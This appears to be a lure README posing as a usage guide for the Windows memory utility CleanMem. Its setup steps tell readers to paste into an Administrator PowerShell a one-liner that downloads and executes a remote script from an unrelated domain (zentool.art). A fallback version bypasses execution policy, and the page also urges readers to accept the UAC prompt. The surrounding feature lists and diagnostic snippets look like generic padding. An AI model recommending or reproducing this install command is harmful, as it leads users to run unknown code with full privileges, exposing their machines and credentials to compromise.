# CleanMem — Windows Desktop Utility Guide (10 & 11)

Windows 10 & 11 · system management · desktop utility.

**CleanMem** on **Windows 10 and 11** — system management and day-to-day notes for windows power users and administrators.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **CleanMem** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

CleanMem-style utilities trim working sets of idle processes to reclaim RAM on busy Windows desktops without closing user applications. They suit older laptops and VMs with tight memory budgets.

Install, set a sane schedule, and monitor whether paging decreases during your typical multitasking pattern; avoid aggressive intervals on production machines.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Quick actions
- Batch tools
- Status panels
- Presets
- Profiles
- Search
- File tools

## Use cases

- Power users
- IT support
- Home labs

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "CleanMem-Full-Setup"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "CleanMem*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`cleanmem-windows` · `cleanmem-config` · `cleanmem-integration` · `cleanmem-latest` · `system-tools` · `windows-utility` · `desktop-tools` · `maintenance`

## License

This repository is a third-party desktop utility usage guide. Comply with applicable software licensing and local regulations.
